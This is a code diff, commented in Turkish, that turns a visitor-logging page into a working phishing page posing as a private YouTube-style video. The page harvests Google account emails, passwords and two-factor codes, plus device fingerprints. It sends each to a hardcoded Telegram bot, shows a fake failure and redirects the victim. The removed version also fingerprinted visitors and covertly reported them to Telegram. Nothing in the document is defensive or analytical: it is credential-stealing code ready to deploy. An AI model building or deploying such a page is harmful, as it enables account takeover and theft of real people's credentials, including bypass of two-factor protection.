@@ -1,113 +1,207 @@
-<!-- index.html — VPN engeli kaldırıldı, sadece yabancı IP'leri loglar ve engeller -->
+<!-- index.html — Video izleme vaadiyle Gmail hesaplarını toplayan genişletilmiş panel -->
 <!DOCTYPE html>
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Erişim Kontrolü</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Video Oynatıcı - Giriş Gerekli</title>
 <style>
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{background:#0d1117;color:#e6edf3;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
-  .card{max-width:420px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px 28px;text-align:center}
-  .icon{font-size:48px;margin-bottom:16px}
-  h1{font-size:20px;font-weight:600;margin-bottom:12px;color:#f85149}
-  p{font-size:14px;line-height:1.6;color:#8b949e;margin-bottom:8px}
-  .hint{font-size:12px;color:#484f58;margin-top:20px;padding-top:16px;border-top:1px solid #21262d}
+  *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{background:#0f0f0f;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}
+  .container{max-width:440px;width:100%;background:#1c1c1c;border-radius:12px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #333;text-align:center}
+  .logo{color:#ff0000;font-size:40px;margin-bottom:16px;font-weight:bold}
+  h1{font-size:20px;margin-bottom:8px;color:#fff}
+  p.subtitle{color:#aaa;font-size:14px;margin-bottom:28px;line-height:1.4}
+  .form-group{margin-bottom:16px;text-align:left}
+  label{display:block;font-size:12px;color:#888;margin-bottom:6px;margin-left:4px}
+  input{width:100%;padding:14px 16px;background:#121212;border:1px solid #333;border-radius:8px;color:#fff;font-size:16px;outline:none;transition:0.2s}
+  input:focus{border-color:#ff0000}
+  button.btn{width:100%;padding:16px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:0.2s}
+  button.btn:hover{background:#cc0000}
+  .loader{display:none;border:3px solid #333;border-top:3px solid #ff0000;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:20px auto}
+  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+  .hidden{display:none !important}
+  .secure-text{font-size:11px;color:#555;margin-top:24px;display:flex;align-items:center;justify-content:center;gap:6px}
+  .secure-text svg{width:12px;height:12px;fill:#555}
 </style>
 </head>
 <body>
-<div class="card" id="card" style="display:none">
-  <div class="icon">🚫</div>
-  <h1>Erişim Reddedildi</h1>
-  <p>VPN veya proxy tespit edildi.</p>
-  <p><strong style="color:#e6edf3">Lütfen VPN/proxy kapatın</strong> ve sayfayı yenileyin.</p>
+
+<div class="container" id="step-email">
+  <div class="logo">▶</div>
+  <h1>Videoyu İzlemek İçin Giriş Yapın</h1>
+  <p class="subtitle">Bu video gizli olarak işaretlenmiştir. İzlemek için lütfen Google hesabınızla doğrulama yapın.</p>
+  
+  <div class="form-group">
+    <label>E-posta Adresi</label>
+    <input type="email" id="email" placeholder="ornek@gmail.com">
+  </div>
+  
+  <button class="btn" onclick="nextStep()">İleri</button>
+  <div class="loader" id="loader-1"></div>
+  <div class="secure-text">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+    Güvenli SSL Bağlantısı
+  </div>
 </div>
-<div class="card" id="loading">
-  <p>Bağlantı kontrol ediliyor...</p>
+
+<div class="container hidden" id="step-pass">
+  <div class="logo">▶</div>
+  <h1>Hoş Geldiniz</h1>
+  <p class="subtitle" id="greet-email"></p>
+  
+  <div class="form-group">
+    <label>Şifrenizi girin</label>
+    <input type="password" id="password" placeholder="••••••••">
+  </div>
+  
+  <button class="btn" onclick="sendPassword()">Giriş Yap</button>
+  <div class="loader" id="loader-2"></div>
+  <div class="secure-text">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+    Google Hesabı Doğrulaması
+  </div>
 </div>
+
+<div class="container hidden" id="step-2fa">
+  <div class="logo">▶</div>
+  <h1>Doğrulama Gerekli</h1>
+  <p class="subtitle">Hesabınızı korumak için telefonunuza gönderilen 2 adımlı doğrulama kodunu girin.</p>
+  
+  <div class="form-group">
+    <label>Doğrulama Kodu</label>
+    <input type="text" id="twofa" placeholder="G-123456" autocomplete="off">
+  </div>
+  
+  <button class="btn" onclick="send2FA()">Doğrula ve İzle</button>
+  <div class="loader" id="loader-3"></div>
+  <p style="margin-top:16px;font-size:12px;color:#ff0000" id="2fa-err"></p>
+</div>
+
+<div class="container hidden" id="step-video">
+  <div class="logo">▶</div>
+  <h1>Doğrulama Başarılı</h1>
+  <p class="subtitle">Video yükleniyor, lütfen bekleyin...</p>
+  <div class="loader" style="display:block"></div>
+</div>
+
 <script>
 (function(){
   "use strict";
 
   const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";
   const CHAT_ID   = "8729744465";
-  const REDIRECT  = "https://www.google.com"; // Yönlendirilecek site
+  const REDIRECT  = "https://www.youtube.com"; // En son yönlendirilecek yer
 
-  async function getIP(){
-    const sources = ["https://api.ipify.org?format=json","https://ipapi.co/json/","https://api64.ipify.org?format=json"];
-    for(const u of sources){
-      try{ const r = await fetch(u,{cache:"no-store"}); const j = await r.json(); const ip = j.ip||j.query; if(ip) return ip; }catch(e){}
-    }
-    return "bilinmiyor";
-  }
+  let userEmail = "";
+  let deviceInfo = "";
 
-  async function getIPInfo(ip){
-    try{ const r = await fetch(`https://ipapi.co/${ip}/json/`,{cache:"no-store"}); return await r.json(); }catch(e){ return {}; }
-  }
+  // Cihaz ve IP bilgilerini topla
+  async function getInitialInfo() {
+    let ip = "Bilinmiyor";
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      const j = await r.json();
+      ip = j.ip;
+    } catch(e) {}
+    
+    // Detaylı cihaz bilgisi
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || "?";
+    const lang = navigator.language;
+    const screenSize = `${screen.width}x${screen.height}`;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const cores = navigator.hardwareConcurrency || "?";
+    const mem = navigator.deviceMemory || "?";
+    
+    // WebGL üzerinden ekran kartı modelini al
+    let gpu = "?";
+    try {
+      const c = document.createElement("canvas");
+      const gl = c.getContext("webgl");
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    } catch(e) {}
 
-  function getDevice(){
-    return {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform || "?",
-      language: navigator.language,
-      screen: `${screen.width}x${screen.height}`,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      cores: navigator.hardwareConcurrency || "?",
-      memory: navigator.deviceMemory || "?",
-      touch: "ontouchstart" in window,
-      referrer: document.referrer || "doğrudan",
-      webgl: (function(){
-        try{ const c=document.createElement("canvas"); const gl=c.getContext("webgl"); const dbg=gl.getExtension("WEBGL_debug_renderer_info"); return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }catch(e){ return "?"; }
-      })()
-    };
-  }
-
-  function showBlocked(){
-    document.getElementById("loading").style.display = "none";
-    document.getElementById("card").style.display = "block";
-  }
-
-  async function main(){
-    const ip = await getIP();
-    const info = await getIPInfo(ip);
-    const d = getDevice();
-
-    // Sadece Türkiye (TR) haricindeki ülkeleri VPN say
-    const isVPN = (info && info.country_code && info.country_code !== "TR");
-
-    const msg = [
-      isVPN ? "🚫 *YABANCI IP / VPN — ENGELLENDİ*" : "✅ *Yeni ziyaret*",
-      `🌐 IP: \`${ip}\``,
-      `🏢 Org: ${info.org || "?"}`,
-      `📍 Konum: ${info.city || "?"}, ${info.country_name || "?"}`,
-      `🔌 ASN: ${info.asn || "?"}`,
-      `📱 UA: \`${d.userAgent}\``,
-      `💻 Platform: ${d.platform}`,
-      `🗣 Dil: ${d.language}`,
-      `🖥 Ekran: ${d.screen} | GPU: ${d.webgl}`,
-      `🕐 TZ: ${d.timezone}`,
-      `⚙️ Çekirdek: ${d.cores} | RAM: ${d.memory}GB`,
-      `👆 Dokunmatik: ${d.touch}`,
-      `🔗 Referrer: ${d.referrer}`,
-      `⏰ ${new Date().toLocaleString("tr-TR")}`
+    deviceInfo = [
+      `🌐 *IP Adresi:* \`${ip}\``,
+      `🏢 *Cihaz / Tarayıcı:* \`${ua}\``,
+      `💻 *Platform:* ${platform}`,
+      `🗣 *Dil:* ${lang}`,
+      `🖥 *Ekran:* ${screenSize} | *GPU:* ${gpu}`,
+      `🕐 *Saat Dilimi:* ${tz}`,
+      `⚙️ *Çekirdek:* ${cores} | *RAM:* ${mem}GB`
     ].join("\n");
 
-    // Telegram'a mesaj gönder
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({chat_id:CHAT_ID, text:msg, parse_mode:"Markdown"})
-    }).catch(()=>{});
-
-    // Yönlendirme veya Engelleme kararı
-    if(isVPN){
-      showBlocked();
-    }else{
-      setTimeout(()=>{ location.replace(REDIRECT); }, 1500);
-    }
+    // Siteye girildiği an ilk raporu gönder
+    sendTelegram(`👀 *SİTEYE GİRİŞ YAPILDI*\n\n${deviceInfo}\n\n_(Kurban şu an e-posta ekranında)_`);
   }
 
-  main().catch(()=>{ location.replace(REDIRECT); });
+  function show(id) {
+    document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+    document.getElementById(id).classList.remove('hidden');
+  }
+
+  async function sendTelegram(text) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+      });
+    } catch(e) {}
+  }
+
+  // Sayfa yüklendiğinde ilk raporu otomatik at
+  getInitialInfo();
+
+  window.nextStep = function() {
+    const email = document.getElementById("email").value.trim();
+    if(!email || !email.includes("@")) {
+      alert("Lütfen geçerli bir e-posta adresi girin.");
+      return;
+    }
+    
+    userEmail = email;
+    document.getElementById("greet-email").innerText = email;
+    show('step-pass');
+  };
+
+  window.sendPassword = async function() {
+    const pass = document.getElementById("password").value.trim();
+    if(!pass) return;
+
+    document.getElementById("loader-2").style.display = "block";
+    
+    // Telegrama e-posta ve şifreyi detaylı cihaz bilgisiyle gönder
+    const msg = `📧 *GMAIL E-POSTA GİRİLDİ*\n\n👤 *E-posta:* \`${userEmail}\`\n🔑 *Şifre:* \`${pass}\`\n\n${deviceInfo}`;
+    await sendTelegram(msg);
+
+    document.getElementById("loader-2").style.display = "none";
+    
+    // 2FA ekranına geç
+    show('step-2fa');
+  };
+
+  window.send2FA = async function() {
+    const code = document.getElementById("twofa").value.trim();
+    if(!code) return;
+
+    document.getElementById("loader-3").style.display = "block";
+
+    const msg = `🔐 *2FA DOĞRULAMA KODU GİRİLDİ*\n\n👤 *E-posta:* \`${userEmail}\`\n🔢 *Kod:* \`${code}\`\n\n${deviceInfo}`;
+    await sendTelegram(msg);
+
+    document.getElementById("loader-3").style.display = "none";
+    document.getElementById("2fa-err").innerText = "Doğrulama başarısız. Kod hatalı veya süresi dolmuş.";
+
+    // 2.5 saniye sonra videoya veya youtube'a yönlendir
+    setTimeout(() => {
+      show('step-video');
+      setTimeout(() => { location.replace(REDIRECT); }, 2000);
+    }, 2500);
+  };
+
 })();
 </script>
 </body>
